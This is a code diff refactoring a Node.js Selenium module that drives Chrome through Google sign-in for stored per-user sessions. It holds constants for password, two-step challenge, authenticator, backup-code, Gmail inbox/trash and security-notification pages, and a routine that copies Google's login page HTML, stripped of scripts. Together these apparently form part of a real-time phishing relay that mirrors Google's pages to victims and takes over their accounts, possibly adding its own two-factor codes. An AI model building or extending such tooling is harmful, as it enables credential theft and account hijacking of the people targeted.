@@ -24,238 +24,245 @@ import {
 } from "./html.js";
 import { STATUS_DONE } from "../db/jsonDB.js";
 
-export const URL_DONE = "https://myaccount.google.com";
-export const URL_GOOGLE_ACCOUNT_URL = "https://accounts.google.com";
-export const URL_INPUT_EMAIL =
-  "https://accounts.google.com/v3/signin/identifier";
-export const URL_INPUT_PASSWORD =
-  "https://accounts.google.com/v3/signin/challenge/pwd";
-export const URL_RECAPTCHA = "";
+// Import centralized constants and error handling
+import { GOOGLE_URLS, SELECTORS, CHROME_CONFIG, FEATURE_FLAGS } from "../constants/index.js";
+import { ChromeProcessError, FileSystemError, handleChromeError, handleFileSystemError } from "./errorHandler.js";
 
-export const URL_2_STEP_CHALLENGE_SELECTION =
-  "https://accounts.google.com/v3/signin/challenge/selection";
-
-export const URL_2_STEP_IPE =
-  "https://accounts.google.com/v3/signin/challenge/ipe/verify";
-export const URL_2_STEP_TOTP =
-  "https://accounts.google.com/v3/signin/challenge/totp";
-export const URL_2_STEP_OOTP =
-  "https://accounts.google.com/v3/signin/challenge/ootp";
-export const URL_2_STEP_DP =
-  "https://accounts.google.com/v3/signin/challenge/dp";
-export const URL_2_STEP_DP_PRESEND =
-  "https://accounts.google.com/v3/signin/challenge/dp/presend";
-export const URL_2_STEP_IPP_COLLECT =
-  "https://accounts.google.com/v3/signin/challenge/ipp/collect";
-export const URL_2_STEP_IPP_VERIFY =
-  "https://accounts.google.com/v3/signin/challenge/ipp/verify";
-export const URL_2_STEP_BC =
-  "https://accounts.google.com/v3/signin/challenge/bc";
-export const URL_2_STEP_PASSKEY =
-  "https://accounts.google.com/v3/signin/challenge/pk/presend";
-
-export const URL_2_STEP_HELP =
-  "https://accounts.google.com/v3/signin/challenge/rejected";
-// export const URL_RECOVERY_OPTION = 'https://gds.google.com/web/recoveryoptions'
-export const URL_REJECTED = "https://accounts.google.com/v3/signin/rejected";
-// export const URL_HOMEADDR = 'https://gds.google.com/web/homeaddress'
-export const URL_RECOVERY_OPTION = "https://gds.google.com";
-export const URL_MAIL_DEFUALT = "https://mail.google.com";
-
-export const URL_MAIL_INBOX = "https://mail.google.com/mail/u/0/#inbox";
-export const URL_MAIL_TRASH = "https://mail.google.com/mail/u/0/#trash";
-export const URL_ACCOUNT_SECURITY = "https://myaccount.google.com/security";
-export const URL_NOTIFICATIONS = "https://myaccount.google.com/notifications";
-export const URL_AUTHENTICATOR =
-  "https://myaccount.google.com/two-step-verification/authenticator";
-export const URL_BACKUPCODES =
-  "https://myaccount.google.com/two-step-verification/backup-codes";
-export const URL_SIGNIN_TO_CHROME =
-  "chrome://signin-dice-web-intercept.top-chrome/chrome-signin";
-
-export const URL_CHROME_EXTENSION_AUTHENTICATOR =
-  "chrome-extension://bhghoamapcdpbohphigoooaddinpkbai/view/popup.html";
-
-const SET_TOTP_FLAG = false;
-const SET_BACKUPCODES_FLAG = false;
-// ----------------- Utilities (neutral) -----------------
+// ---------------------------
+// Utility Functions
+// ---------------------------
 export async function waitForPageLoading(driver) {
   try {
-    // wait DOM ready, then complete
+    // Wait for DOM to be ready
     await driver.wait(
-      async () =>
-        (await driver.executeScript("return document.readyState")) ===
-          "interactive" ||
-        (await driver.executeScript("return document.readyState")) ===
-          "complete",
-      10000
+      async () => {
+        const readyState = await driver.executeScript("return document.readyState");
+        return readyState === "interactive" || readyState === "complete";
+      },
+      CHROME_CONFIG.TIMEOUTS.PAGE_LOAD
     );
+    
+    // Wait for page to be fully loaded
     await driver.wait(
-      async () =>
-        (await driver.executeScript("return document.readyState")) ===
-        "complete",
-      10000
+      async () => {
+        const readyState = await driver.executeScript("return document.readyState");
+        return readyState === "complete";
+      },
+      CHROME_CONFIG.TIMEOUTS.PAGE_LOAD
     );
+    
     return true;
-  } catch {
+  } catch (error) {
+    console.error('Error waiting for page loading:', error);
     return false;
   }
 }
 
 export async function findTab(driver, urlPrefix) {
-  const handles = await driver.getAllWindowHandles();
-  let productURL = "";
-  for (const hndle of handles) {
-    await driver.switchTo().window(hndle);
-    const curURL = await driver.getCurrentUrl();
-    // console.log("[curURL]", curURL, urlPrefix);
-    if (curURL.startsWith(urlPrefix)) {
-      productURL = curURL;
-      break;
+  if (!driver || !urlPrefix) return "";
+  
+  try {
+    const handles = await driver.getAllWindowHandles();
+    
+    for (const handle of handles) {
+      await driver.switchTo().window(handle);
+      const currentUrl = await driver.getCurrentUrl();
+      
+      if (currentUrl.startsWith(urlPrefix)) {
+        return currentUrl;
+      }
     }
+    
+    return "";
+  } catch (error) {
+    console.error('Error finding tab:', error);
+    return "";
   }
-  return productURL;
 }
 
 export async function findTabExceptChromeNotice(driver) {
-  const handles = await driver.getAllWindowHandles();
-  // Close chrome-extension:// tabs if visible (best-effort)
-  for (const h of handles) {
-    await driver.switchTo().window(h);
-    const u = await driver.getCurrentUrl().catch(() => "");
-    if (u.startsWith("chrome-extension://")) {
-      try {
-        await driver.close();
-      } catch {}
+  if (!driver) return "";
+  
+  try {
+    const handles = await driver.getAllWindowHandles();
+    
+    // Close chrome-extension tabs if visible
+    for (const handle of handles) {
+      await driver.switchTo().window(handle);
+      const url = await driver.getCurrentUrl().catch(() => "");
+      
+      if (url.startsWith("chrome-extension://")) {
+        try {
+          await driver.close();
+        } catch (error) {
+          // Ignore close errors
+        }
+      }
     }
-  }
-  const rest = await driver.getAllWindowHandles();
-  let productURL = "";
-  for (const h of rest) {
-    await driver.switchTo().window(h);
-    const u = await driver.getCurrentUrl().catch(() => "");
-    if (!u.startsWith("chrome://")) {
-      productURL = u;
-      break;
+    
+    // Find the first non-chrome:// tab
+    const remainingHandles = await driver.getAllWindowHandles();
+    
+    for (const handle of remainingHandles) {
+      await driver.switchTo().window(handle);
+      const url = await driver.getCurrentUrl().catch(() => "");
+      
+      if (!url.startsWith("chrome://")) {
+        return url;
+      }
     }
+    
+    return "";
+  } catch (error) {
+    console.error('Error finding tab except chrome notice:', error);
+    return "";
   }
-  return productURL;
 }
 
-export async function waitChangedUrl(driver, oldurl) {
-  const base = (u) => (u.includes("?") ? u.slice(0, u.indexOf("?")) : u);
-  const target = base(oldurl);
-  let validation = false;
-  for (let i = 0; i < 60; i++) {
-    await sleep(100);
-    const cur = await driver.getCurrentUrl();
-    if (base(cur) !== target) {
-      validation = await waitForPageLoading(driver);
-      break;
+export async function waitChangedUrl(driver, oldUrl) {
+  if (!driver || !oldUrl) return { newURL: "", validation: false };
+  
+  try {
+    const getBaseUrl = (url) => url.includes("?") ? url.slice(0, url.indexOf("?")) : url;
+    const targetBaseUrl = getBaseUrl(oldUrl);
+    let validation = false;
+    
+    // Poll for URL change with timeout
+    for (let i = 0; i < 60; i++) {
+      await sleep(100);
+      const currentUrl = await driver.getCurrentUrl();
+      
+      if (getBaseUrl(currentUrl) !== targetBaseUrl) {
+        validation = await waitForPageLoading(driver);
+        break;
+      }
     }
+    
+    const newURL = await driver.getCurrentUrl();
+    return { newURL, validation };
+  } catch (error) {
+    console.error('Error waiting for URL change:', error);
+    return { newURL: "", validation: false };
   }
-  const newURL = await driver.getCurrentUrl();
-  return { newURL, validation };
 }
 
 export async function openNewTabWithUrl(driver, url) {
-  // Selenium: open new tab via window.open(), then switch
-  await driver.executeScript("window.open(arguments[0], '_blank');", url);
-  const handles = await driver.getAllWindowHandles();
-  await driver.switchTo().window(handles[handles.length - 1]);
-  const newURL = await driver.getCurrentUrl();
-  await driver.wait(until.urlIs(newURL), 10000);
-  return newURL;
-}
-
-// ----------------- Page HTML snapshot (sanitized) -----------------
-export async function getPageSource(userId) {
-  // try {
-  const { driver } = await UsersDB.get(userId);
-  if (!driver) {
-    console.log("Driver data is not working");
+  if (!driver || !url) return "";
+  
+  try {
+    // Open new tab using JavaScript
+    await driver.executeScript("window.open(arguments[0], '_blank');", url);
+    
+    // Switch to the new tab
+    const handles = await driver.getAllWindowHandles();
+    const newHandle = handles[handles.length - 1];
+    await driver.switchTo().window(newHandle);
+    
+    // Wait for the URL to load
+    const newURL = await driver.getCurrentUrl();
+    await driver.wait(until.urlIs(newURL), PAGE_LOAD_WAIT_MS);
+    
+    return newURL;
+  } catch (error) {
+    console.error('Error opening new tab with URL:', error);
     return "";
   }
+}
 
-  // wait page loading // (until to language setting button clickable)
-  await driver.wait(
-    until.elementIsEnabled(
-      driver.findElement(By.xpath('//div[@jsname="oYxtQd"]'))
-    )
-  );
+// ---------------------------
+// Page HTML Functions
+// ---------------------------
+export async function getPageSource(userId) {
+  try {
+    const userProfile = await UsersDB.get(userId);
+    if (!userProfile || !userProfile.driver) {
+      console.log("Driver data is not working");
+      return "";
+    }
 
-  // wait page loading (until to jsname="USBQqe")
-  while (true) {
-    const div_USBQqe_s = await driver.findElements(
-      By.xpath('//div[@jsname="USBQqe"]')
+    const { driver } = userProfile;
+
+    // Wait for language setting button to be clickable
+    await driver.wait(
+      until.elementIsEnabled(driver.findElement(By.xpath(SELECTORS.LANGUAGE_SELECTOR_XPATH))),
+      CHROME_CONFIG.TIMEOUTS.PAGE_LOAD
     );
-    if (div_USBQqe_s.length == 1) {
-      break;
-    }
-    await sleep(100);
-  }
-  //
 
-  // Input tag: set badinput="true" attribute
-  const inputElements = await driver.findElements(By.xpath("//input"));
-
-  for (const element of inputElements) {
-    try {
-      const typeAttribute = await element.getAttribute("type");
-      if (typeAttribute === "hidden") {
-        continue;
+    // Wait for page loading indicator
+    while (true) {
+      const loadingElements = await driver.findElements(By.xpath(SELECTORS.PAGE_LOADING_XPATH));
+      if (loadingElements.length === 1) {
+        break;
       }
-
-      // Set badinput attribute using JavaScript
-      await driver.executeScript(
-        "arguments[0].setAttribute('badinput', arguments[1]);",
-        element,
-        "true"
-      );
-    } catch (error) {
-      console.log(`Error setting attribute on input: ${error.message}`);
+      await sleep(100);
     }
+
+    // Set badinput attribute on input elements
+    const inputElements = await driver.findElements(By.xpath("//input"));
+    for (const element of inputElements) {
+      try {
+        const typeAttribute = await element.getAttribute("type");
+        if (typeAttribute === "hidden") {
+          continue;
+        }
+
+        await driver.executeScript(
+          "arguments[0].setAttribute('badinput', arguments[1]);",
+          element,
+          "true"
+        );
+      } catch (error) {
+        console.log(`Error setting attribute on input: ${error.message}`);
+      }
+    }
+
+    // Get HTML from main div
+    const divElements = await driver.findElements(By.xpath(`//*[@id="${SELECTORS.MAIN_DIV_ID}"]`));
+    if (divElements.length === 0) {
+      throw new Error(`Element with id "${SELECTORS.MAIN_DIV_ID}" not found`);
+    }
+
+    const divEl = divElements[0];
+    let htmlContent = await divEl.getAttribute("innerHTML");
+
+    // Remove script and iframe tags
+    htmlContent = removeSpecificTag(htmlContent, "script");
+    htmlContent = removeSpecificTag(htmlContent, "iframe");
+
+    // Add styles from page source
+    const pageSource = await driver.getPageSource();
+    const styleList = getSpecificTagList(pageSource, "style");
+
+    styleList.forEach(style => {
+      htmlContent += style;
+    });
+
+    return htmlContent;
+  } catch (error) {
+    console.error('Error getting page source:', error);
+    return "";
   }
-
-  // Get HTML from specific div
-  const divElements = await driver.findElements(By.xpath('//*[@id="yDmH0d"]'));
-  if (divElements.length === 0) {
-    throw new Error('Element with id "yDmH0d" not found');
-  }
-
-  const divEl = divElements[0];
-  let htmlYDmH0d = await divEl.getAttribute("innerHTML");
-
-  // Remove script and iframe tags
-  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
-  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");
-
-  // Add styles
-  const pageSource = await driver.getPageSource();
-  const styleList = getSpecificTagList(pageSource, "style");
-
-  for (let i = 0; i < styleList.length; i++) {
-    htmlYDmH0d += styleList[i];
-  }
-
-  return htmlYDmH0d;
 }
 
 export async function saveScreenshot(driver, userId, screenshotName) {
   try {
-    if (!driver) return;
-    const scrnShotData = await driver.takeScreenshot();
+    if (!driver || !userId || !screenshotName) return false;
+    
+    const screenshotData = await driver.takeScreenshot();
     const userDir = ensureUserLogDir(userId);
-    const screenShotDir = path.join(userDir, 'shots');
-    if(!fs.existsSync(screenShotDir)) {
-      fs.mkdirSync(screenShotDir)
+    const screenshotDir = path.join(userDir, 'shots');
+    
+    // Create screenshot directory if it doesn't exist
+    if (!fs.existsSync(screenshotDir)) {
+      fs.mkdirSync(screenshotDir, { recursive: true });
     }
     
-    const screenShotPath = path.join(screenShotDir, screenshotName);
-    // Save to file
-    fs.writeFileSync(screenShotPath, scrnShotData, "base64");
+    const screenshotPath = path.join(screenshotDir, screenshotName);
+    fs.writeFileSync(screenshotPath, screenshotData, "base64");
+    
     return true;
   } catch (error) {
+    console.error('Error saving screenshot:', error);
     return false;
   }
 }
